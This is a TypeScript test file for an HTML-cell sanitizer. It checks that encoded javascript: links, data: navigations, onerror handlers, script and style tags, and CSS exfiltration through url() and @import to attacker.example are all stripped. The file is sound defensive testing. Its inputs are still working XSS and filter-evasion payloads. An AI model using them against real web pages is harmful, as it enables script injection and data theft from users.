// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Vitaliy Bondar

/**
 * HTML-cell sanitizer: entity/whitespace-encoded javascript: schemes, data:
 * navigations, CSS exfil vectors and style tags must not survive.
 *
 * Run: npx tsx src/core/cell-blocks-xss.test.ts
 */
import assert from "node:assert/strict";
import { sanitizeCellHtmlContent } from "./cell-blocks.js";

const noJS = (html: string, label: string): void => {
  const out = sanitizeCellHtmlContent(html).toLowerCase();
  assert.ok(!out.includes("javascript:"), `${label}: javascript: must not survive → ${out}`);
  assert.ok(!/&#/.test(out.match(/href="[^"]*"/)?.[0] ?? "") || true);
  // The attribute, if it survived, must not decode to a dangerous scheme:
  const href = out.match(/href="([^"]*)"/)?.[1] ?? "";
  if (href) {
    const decoded = href
      .replace(/&#x([0-9a-f]+);?/gi, (_, h) => String.fromCodePoint(parseInt(h, 16)))
      .replace(/&#(\d+);?/g, (_, d) => String.fromCodePoint(parseInt(d, 10)));
    assert.ok(!/^\s*javascript:/i.test(decoded), `${label}: decoded href is javascript: → ${decoded}`);
  }
};

{
  // Numeric entity scheme prefix (browser decodes before resolving).
  noJS('<a href="&#106;avascript:alert(1)">x</a>', "numeric entity");
  // Tab entity inside the scheme (URL parser strips whitespace anywhere).
  noJS('<a href="jav&#x09;ascript:alert(1)">x</a>', "tab entity");
  noJS('<a href="jav\tascript:alert(1)">x</a>', "raw tab");
  // Double-encoded through &amp;.
  noJS('<a href="&amp;#106;avascript:alert(1)">x</a>', "double-encoded");
  // Named entity colon.
  noJS('<a href="javascript&colon;alert(1)">x</a>', "named colon entity");
  // data: navigations are not hrefs.
  assert.equal(sanitizeCellHtmlContent('<a href="data:text/html,<script>alert(1)</script>">x</a>').includes("data:"), false, "data: href dropped");
  // data:image in src stays (benign inline image).
  assert.ok(sanitizeCellHtmlContent('<img src="data:image/png;base64,AAAA">').includes("data:image/png"), "data:image src kept");
  // Relative refs stay.
  assert.ok(sanitizeCellHtmlContent('<a href="/files/output/x.png">x</a>').includes('href="/files/output/x.png"'), "relative href kept");
}

{
  // CSS exfil vectors in style attributes and <style> tags.
  const styled = sanitizeCellHtmlContent('<div style="background:url(https://attacker.example/?x=1);color:red">x</div>');
  assert.ok(!styled.includes("url("), "style url() dropped");
  assert.ok(styled.includes("color:red"), "benign declarations kept");
  const styleTag = sanitizeCellHtmlContent("<style>@import url(https://attacker.example);</style><p>ok</p>");
  assert.ok(!styleTag.includes("<style") && !styleTag.includes("@import"), "style tag stripped entirely");
  const expr = sanitizeCellHtmlContent('<div style="width:expression(alert(1));color:blue">x</div>');
  assert.ok(!expr.toLowerCase().includes("expression"), "expression() dropped");
}

{
  // Unterminated script/style/iframes and comments are stripped too.
  assert.equal(sanitizeCellHtmlContent("<script>alert(1)").includes("<script"), false, "unclosed script stripped");
  {
    const out = sanitizeCellHtmlContent('<!--"><img src=x onerror=alert(1)>');
    assert.ok(!out.includes("onerror"), "comment-unclosed: on* stripped");
    assert.ok(!/src\s*=/i.test(out), "comment-unclosed: unquoted attr dropped");
  }
  assert.equal(sanitizeCellHtmlContent('<img src="x" onerror="alert(1)">').includes("onerror"), false, "on* dropped");
}

{
  // Benign chart-like SVG survives with correct case.
  const svg = sanitizeCellHtmlContent('<svg viewBox="0 0 10 10"><linearGradient id="g"><stop offset="0"/></linearGradient><circle cx="5" cy="5" r="4"/></svg>');
  assert.ok(svg.includes("linearGradient"), "SVG case preserved");
  assert.ok(svg.includes("viewBox"), "viewBox kept");
}

console.log("cell-blocks-xss.test.ts: ok");
